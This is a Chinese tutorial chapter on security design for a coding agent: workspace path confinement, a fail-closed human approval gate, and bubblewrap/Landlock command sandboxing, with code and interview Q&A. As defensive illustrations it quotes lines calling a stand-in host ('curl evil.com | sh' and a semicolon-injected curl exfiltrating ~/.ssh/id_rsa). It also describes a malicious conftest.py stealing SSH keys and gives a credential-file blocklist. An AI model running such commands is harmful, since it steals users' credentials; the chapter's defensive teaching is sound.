# 第 8 章：安全设计

> 目标：读完这章，你能讲清楚「工作区禁闭、审批闸门、沙箱」三层防线**各自管什么、为什么不能只有一层**。

这是编码 Agent 与聊天机器人的分水岭。一旦 Agent 能读写文件、执行命令，就必须有一层专门回答「它能碰什么」「碰之前要不要问人」「同意之后最多能造成多大破坏」。

---

## 8.1 为什么需要三层

先看一个真实威胁场景：

> 你同意 Agent 跑 `pytest`。但这个项目里有个恶意的 `conftest.py`，pytest 一启动就会读走你的 `~/.ssh/id_rsa` 发到外网。
> 你点同意时想的是「跑个测试」，可没同意它偷 SSH key。

这一个例子就说明了为什么一层不够：

- **只有审批不够**：你同意的是「跑 pytest」，但 pytest 内部干了什么你不知道。审批管不了「同意之后它实际做什么」。
- **只有沙箱不够**：沙箱允许的范围内，Agent 可能干你不想的事（比如删掉你工作区里的源码——这完全在沙箱允许范围内）。
- **只有工作区禁闭不够**：它管的是路径，但 `run_command("curl evil.com | sh")` 不需要越界路径就能干坏事。

所以三层各管一件事，**互补不替代**：

| 层 | 管什么问题 | 比喻 |
|---|---|---|
| 工作区禁闭 | 「它能碰哪些路径」 | 门卫：你只能进这个房间 |
| 审批闸门 | 「要不要让它做这件事」 | 确认单：你知情并同意吗 |
| 命令沙箱 | 「同意之后最多能造成多大破坏」 | 笼子：就算它发疯也出不去 |

## 8.2 第一层：工作区禁闭（Workspace）

`app/workspace.py`。所有文件操作的第一道关卡。

### 核心方法 resolve()

```python
def resolve(self, path: str) -> Path:
    if not path or not path.strip():
        raise WorkspaceError("路径不能为空")
    candidate = Path(path).expanduser()
    full = candidate if candidate.is_absolute() else self.root / candidate
    resolved = full.resolve()  # ← 关键：先展开 .. 和符号链接
    if resolved != self.root and not resolved.is_relative_to(self.root):
        raise WorkspaceError(f"拒绝访问工作区外的路径：{path}")
    return resolved
```

### ★ 为什么先 resolve 再判断归属

这是工作区禁闭最微妙的点。**顺序不能反。**

如果先判断归属再 resolve：用户给的路径 `./symlink_to_etc_passwd` 看起来在工作区内（symlink 文件本身在工作区），但 `resolve()` 之后它指向 `/etc/passwd`——逃出去了。

所以必须：**先 resolve（展开所有 .. 和符号链接到真实绝对路径），再判断这个真实路径在不在工作区内**。这样符号链接逃逸攻击失效。

### 其他防线

除了路径禁闭，Workspace 还有：

- **`.gitignore` 遵循**：自动跳过 gitignore 的文件（用 `pathspec` 库解析）
- **敏感文件黑名单**：`.env` / `credentials.json` / `id_rsa` / `*.pem` / `*.key` 等，**单独于 gitignore 之外再挡一道**——被忽略和禁止读取是两件事，前者影响遍历，后者在精确读取也要挡
- **绝对黑名单**：`.git` / `node_modules` 等永远不碰

```python
_SENSITIVE_NAMES = {".env", ".env.local", "credentials.json", "id_rsa", "id_ed25519"}
_SENSITIVE_SUFFIXES = {".pem", ".key", ".p12", ".pfx", ".keystore"}
```

代码：`app/workspace.py`（敏感文件常量 41-42 行，路径禁闭 `resolve()` 63 行）。

## 8.3 第二层：审批闸门（人在回路）

第 6 章讲过风险分级和审批策略。这里补充几个安全设计。

### fail-closed 原则（贯穿全文）

审批环节的**默认值必须是「不执行」**。体现在：

1. **审批结果解析不了 → 按拒绝**（`_parse_decision` 的兜底 return False）
2. **interrupt() 拿不到图上下文 → 拒绝执行而非放行**：

```python
if needs_approval(name):
    try:
        decision = interrupt({...})
    except RuntimeError as e:
        # interrupt() 需要图上下文与 checkpointer。拿不到就拒绝
        logger.error("无法发起审批（%s），按拒绝处理：%s", e, name)
        return ToolMessage(content=f"错误：{name} 需要审批但当前环境无法发起审批...", ...)
```

**为什么必须拒绝而不是放行**：审批环节失效时默认执行，等于安全机制一坏就自动全开。

3. **CLI 交互默认选项是拒绝**（直接回车 = 拒绝）——安全选项必须是默认值
4. **未知工具默认最高风险**（DEFAULT_RISK = EXEC）——新工具没分级时宁可多问

### readonly 模式的特殊性

`readonly` 模式下，写和执行工具**直接拒绝，不打扰用户**：

```python
def _denied_by_policy(name):
    if get_settings().tool_approval_mode == "readonly" and get_risk(name) is not ToolRisk.READ:
        return f"当前为只读模式，拒绝执行 {get_risk(name).value} 级工具 {name}"
    return None
```

「只读模式」= 让 Agent 只能看不能改，连问都不问。

代码：`app/agent/nodes/tools_node.py`。

## 8.4 ★ 第三层：命令沙箱（Sandbox）

这是最硬核的一层。`app/sandbox.py`。

### 为什么 shell=True 是大忌

```python
# ❌ 危险：shell=True 让 ;、&&、|、$(...)、反引号全部生效
subprocess.run(cmd, shell=True)
```

模型只要产出一个带分号的字符串就能绕开任何命令白名单：

```
"echo safe; curl evil.com/steal?data=$(cat ~/.ssh/id_rsa)"
```

`echo` 是白名单里的，但分号后面的 `curl` 也被执行了。

### 正确做法：shlex.split + 列表参数

```python
# ✅ 用 shlex 拆词，列表参数形式执行
argv = shlex.split(cmd)
subprocess.run(argv)  # 分号只是 echo 的普通参数，不会被解释
```

代价：管道 `|`、重定向 `>`、命令替换 `$()` 不能用，需要组合命令时分多次调用。`tests/test_coding_tools.py` 有专门测试验证注入不生效。

### ★ bubblewrap 沙箱（bwrap）

Linux 容器级的命名空间隔离。`_bwrap_argv()`（`sandbox.py:332`）构造命令行：

```python
cmd = [
    "bwrap",
    "--die-with-parent",   # 父进程没了子进程跟着死，不留孤儿
    "--new-session",       # 独立 session，防 TIOCSTI 注入宿主终端
    "--unshare-pid",       # 独立 PID 命名空间
    "--unshare-ipc",
    "--unshare-uts",
    "--unshare-net",       # ← 默认断网（除非 allow_network）
    "--proc", "/proc",
    "--dev", "/dev",
    "--tmpfs", "/tmp",
    # 系统目录只读 bind
    # 工作区 bind 进去
    ...
]
```

**关键安全点：不挂载 $HOME**。`~/.ssh`、`~/.aws`、`~/.config/gh` 里的凭据因此在沙箱里**根本不存在**——这正是「审批通过的 pytest 偷走 SSH key」这条攻击路径要堵的地方。git 等工具需要 HOME，给个 tmpfs 空目录。

### Landlock 沙箱

Linux 内核 5.13+ 的文件系统访问控制（LSM）。`_apply_landlock()` 在子进程 fork 后、exec 前执行：

```python
read_paths = [p for p in _SYSTEM_READ_PATHS if os.path.exists(p)]  # 系统目录只读
write_paths = [str(workspace), tmp, "/dev/null", "/dev/zero", "/dev/urandom"]  # 可写范围

def _preexec():
    _apply_landlock(read_paths, write_paths)
```

可写范围收敛到工作区 + 私有临时目录。

### 私有 tmp 目录的考虑

```python
def _private_tmp():
    path = Path(tempfile.gettempdir()) / f"selfagent-sbx-{os.getpid()}"
    path.mkdir(mode=0o700, parents=True, exist_ok=True)
    return str(path)
```

**不能把整个 /tmp 授予写权限**：那样沙箱里的命令就能读到别人（甚至用户自己）放在 /tmp 下的东西，而 /tmp 恰恰是各类凭据缓存的常见落点。给一个私有目录并把 TMPDIR 指过去，工具链照常工作，暴露面小得多。

### 实测效果

| 操作 | 无沙箱 | Landlock |
|---|---|---|
| 读工作区外的 `id_rsa` | 成功 | `Permission denied` |
| 写工作区外的文件 | 成功 | `cannot touch` |
| 工作区内读写 | 成功 | 成功 |

### 已知限制（诚实声明）

- Landlock 后端**只管文件系统不限制网络**（网络隔离靠 bubblewrap 的 `--unshare-net`）
- 两个后端都**不做 syscall 过滤**，未防提权类攻击
- Windows 上没有可用沙箱后端（这是 win32 平台的已知限制）

代码：`app/sandbox.py:299` 的 `wrap_command()`。

## 8.5 三层怎么协作

跟着「删掉 hello.py」走一遍（EXEC 级，最严格）：

```
Agent 决定调 delete_file(path="hello.py")
  ↓
1. 工作区禁闭：resolve("hello.py") → /workspace/hello.py，在 root 内 ✓
  ↓
2. 审批闸门：delete_file 是 WRITE 级，needs_approval() = True
     interrupt() 挂起，弹确认框
     你按 y
  ↓
3. 沙箱：delete_file 不走沙箱（沙箱只针对命令），但路径已被禁闭
   如果是 run_command("rm hello.py")：
     shlex.split → ["rm", "hello.py"]
     wrap_command 包 bwrap
     bwrap 里执行：cwd 限制、$HOME 不挂载、默认断网
     rm 删的是沙箱内 bind 的工作区文件
```

## 8.6 外部世界怎么做

| 方案 | 隔离机制 | 定位 |
|---|---|---|
| **bubblewrap/Landlock**（本项目） | Linux 内核原生（命名空间 + LSM） | 本地 OS 级禁闭，无网络开销，无冷启动 |
| **E2B** | Firecracker microVM | 远程托管，冷启动 ~150ms，SDK 好，专做不可信代码执行 |
| **Daytona** | 环境式 | 灵活开发环境，2025 转向 AI agent 基础设施 |
| **Modal** | 容器式 | serverless 规模、GPU 工作负载 |
| **Claude Code**（Anthropic 官方） | 走向沙箱化 | 「圈定一块地方随便干」替代逐次审批 |

### 一个有数据的故事

Anthropic 官方数据显示，Claude Code 用户对 **93% 的权限提示点了同意**——说明「逐次审批」在效率上不划算。官方做法是「在预定义边界内让 Claude 更自由地工作」，即把「每次问」升级成「圈定一块地方随便干」。

**这说明业界共识：OS 级强制隔离 > 应用级权限提示。** 本项目选 bubblewrap/Landlock 是正确方向，且更彻底（Linux 原生内核机制）。但本项目仍保留审批——因为「沙箱允许的范围内 Agent 可能干你不想的事」（删源码），所以两者互补。

## 8.7 面试一句话

> **Q：审批和沙箱为什么要分两层？**
> A：它们回答不同问题，互相替代不了。审批管「用户知不知情」（决策层），沙箱管「同意之后最多能造成多大破坏」（执行层）。只有审批不够（pytest 偷 SSH key），只有沙箱不够（删源码在沙箱内）。决策层问人，执行层限权。

> **Q：为什么不用 shell=True？**
> A：shell=True 让 ;、&&、$() 全部生效，模型产出带分号的字符串就能绕开白名单。用 shlex.split + 列表参数，分号只是普通参数。

> **Q：工作区禁闭为什么先 resolve 再判断？**
> A：防符号链接逃逸。symlink 文件本身在工作区内，但 resolve 后可能指向 /etc。先 resolve 展开真实路径再判断归属，攻击失效。
